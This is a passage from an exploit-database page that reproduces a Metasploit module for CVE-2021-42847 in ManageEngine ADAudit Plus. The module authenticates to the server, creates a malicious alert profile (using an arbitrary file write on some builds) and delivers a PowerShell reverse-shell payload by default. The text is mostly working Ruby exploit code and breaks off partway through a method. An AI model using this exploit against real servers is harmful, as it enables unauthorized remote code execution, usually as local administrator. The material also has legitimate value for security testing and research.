---
title: ManageEngine ADAudit Plus Remote Code Execution Exploit exploit
url: https://sploitus.com/exploit?id=1337DAY-ID-38676&utm_source=rss&utm_medium=rss
source: Sploitus.com Exploits RSS Feed
date: 2023-05-10
fetch_date: 2025-10-04T11:39:03.263089
---

# ManageEngine ADAudit Plus Remote Code Execution Exploit exploit

[x]
Dark Mode

[##### SPLOITUS](/)

# ManageEngine ADAudit Plus Remote Code Execution Exploit CVE-2021-42847

2023-05-09 | CVSS 9.8

Copy
Download
Source
[Share](#share-url)

```
## https://sploitus.com/exploit?id=1337DAY-ID-38676
##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

class MetasploitModule < Msf::Exploit::Remote

  Rank = ExcellentRanking
  prepend Msf::Exploit::Remote::AutoCheck
  include Msf::Exploit::Remote::HttpClient
  include Msf::Exploit::Remote::HTTP::ManageEngineAdauditPlus

  def initialize(info = {})
    super(
      update_info(
        info,
        'Name' => 'ManageEngine ADAudit Plus Authenticated File Write RCE',
        'Description' => %q{
          This module exploits security issues in ManageEngine ADAudit Plus
          prior to 7006 that allow authenticated users to execute arbitrary
          code by creating a custom alert profile and leveraging its custom
          alert script component.

          The module first runs a few checks to test the provided
          credentials, retrieve the configured domain(s) and obtain the
          build number of the target ADAudit Plus server.

          If the credentials are valid and the target is
          vulnerable, the module creates an alert profile that will be
          triggered for any failed login attempt to the configured domain.

          For versions prior to build 7004, the payload is directly inserted
          in the custom alert script component of the alert profile.

          For versions 7004 and 7005, the module leverages an arbitrary file
          write vulnerability (CVE-2021-42847) to create a Powershell script
          in the alert_scripts directory that contains the payload. The name
          of this script is then provided as the value for the custom alert
          script component of the alert profile.

          This module requires valid credentials for an account with the
          privileges to create alert scripts. It has been successfully tested
          against ManageEngine ADAudit Plus builds 7003 and 7005 running on
          Windows Server 2012 R2.

          Successful exploitation will result in RCE as the user running
          ManageEngine ADAudit Plus, which will typically be the local
          administrator.
        },
        'License' => MSF_LICENSE,
        'Author' => [
          'Moon', # CVE-2021-42847 discovery
          'Erik Wynter' # @wyntererik - Additional research and Metasploit module
        ],
        'References' => [
          ['CVE', '2021-42847'],
          ['URL', 'https://pitstop.manageengine.com/portal/en/community/topic/fix-released-for-a-vulnerability-in-manageengine-adaudit-plus'],
          ['URL', 'https://www.manageengine.com/products/active-directory-audit/adaudit-plus-release-notes.html']
        ],
        'Privileged' => true,
        'DisclosureDate' => '2021-10-01',
        'Platform' => 'win',
        'Arch' => ARCH_CMD,
        'Targets' => [
          [
            'Windows Command',
            {
              'Type' => :win_cmd,
              'Arch' => ARCH_CMD,
              'DefaultOptions' => {
                'PAYLOAD' => 'cmd/windows/powershell_reverse_tcp'
              }
            }
          ]
        ],
        'DefaultTarget' => 0,
        'DefaultOptions' => {
          'RPORT' => 8081,
          'WfsDelay' => 5 # triggering the payload may take a bit, let's not be too hasty
        },
        'Notes' => {
          'Stability' => [CRASH_SAFE],
          'Reliability' => [FIRST_ATTEMPT_FAIL], # This exploit may fail on its first few attempts whilst the remote system is processing alert updates.
          'SideEffects' => [IOC_IN_LOGS, ARTIFACTS_ON_DISK]
        }
      )
    )

    register_options([
      OptString.new('TARGETURI', [true, 'The base path to ManageEngine ADAudit Plus', '/']),
      OptString.new('AUTH_DOMAIN', [true, 'ADAudit Plus authentication domain (default is ADAuditPlus Authentication)', 'ADAuditPlus Authentication']),
      OptString.new('USERNAME', [true, 'Username to authenticate with', 'admin']),
      OptString.new('PASSWORD', [true, 'Password to authenticate with', 'admin']),
    ])
  end

  def auth_domain
    datastore['AUTH_DOMAIN']
  end

  def username
    datastore['USERNAME']
  end

  def password
    datastore['PASSWORD']
  end

  def delete_alert(adapcsrf_cookie)
    print_status("Attempting to delete alert profile #{@alert_name}")
    # let's try and get the the ID of the alert we want to delete
    res_get_alert = send_request_cgi({
      'uri' => normalize_uri(target_uri.path, 'api', 'json', 'leftTrees', 'getLeftTreeList'),
      'method' => 'POST',
      'keep_cookies' => true,
      'vars_post' => {
        'TAB_ID' => '5', # this cannot be randomized
        'adapcsrf' => adapcsrf_cookie
      }
    })

    unless res_get_alert
      print_warning("Connection failed when attempting to obtain the alert profile ID #{@alert_name}. Manual cleanup required.")
      return
    end

    unless res_get_alert.code == 200 && !res_get_alert.body.empty?
      print_warning("Received unexpected reply when attempting to obtain the alert profile ID #{@alert_name}. Manual cleanup required.")
      return
    end

    alert_id = res_get_alert.body&.scan(/modelId":(\d+),"name":"#{@alert_name}/)&.flatten&.first
    if alert_id.blank?
      print_warning("Failed to obtain the alert profile ID #{@alert_name}. Manual cleanup required.")
      return
    end

    # delete the alert
    res_delete_alert = send_request_cgi({
      'uri' => normalize_uri(target_uri.path, 'api', 'json', 'config', 'alertprofiles', 'delete'),
      'method' => 'POST',
      'keep_cookies' => true,
      'vars_post' => {
        'data' => { 'ids' => [alert_id] }.to_json,
        'adapcsrf' => adapcsrf_cookie
      }
    })

    unless res_delete_alert
      print_warning("Connection failed when attempting to delete alert profile #{@alert_name}. Manual cleanup required.")
      return
    end

    unless res_delete_alert.code == 200 && res_delete_alert.body&.include?('Successfully deleted the alert profile')
      print_warning("Received unexpected reply when attempting to delete alert profile #{@alert_name}. Manual cleanup required.")
      return
    end

    print_good("Successfully deleted alert profile #{@alert_name}")
  end

  def create_alert_profile
    if @exploit_method == 'cve_2021_42847'
      print_status('Attempting to authenticate again in order to retrieve the required cookies.')
      # We have to authenticate again in order to get the required cookie, so reset the cookie cache
      cookie_jar.clear
      login_results = adaudit_plus_login(auth_domain, username, password, true)
      login_msg = login_results['message']
      case login_results['status']
      when adaudit_plus_status::CONNECTION_FAILED
        fail_with(Failure::Unreachable, login_msg)
      when adaudit_plus_status::UNEXPECTED_REPLY
        fail_with(Failure::UnexpectedReply, login_msg)
      when adaudit_plus_status::NO_ACCESS
        fail_with(Failure::NoAccess, login_msg)
      when adaudit_plus_status::SUCCESS
        # just to distinguish it from any other potential statuses this method may return in the future
      else
        # this covers other potential statuses that this method may return in the future
        # note that here the login method should never return adaudit_plus_status::NO_DOMAINS
        # however, if it would do so due to some library change, treating it as an unknown failure makes sense
        fail_with(Failure::Unknown, login_msg)
      end

      # Code must have been a success related code so we should have
      # an adapcsrf_cookie entry within the login results hash.
      @adapcsrf_cookie = login_results['adapcsrf_cookie']
    end

    print_status('Attempting to create an alert profile')
    # visit /api/json/jsMessage to see if we're dealing with 7003 or lower...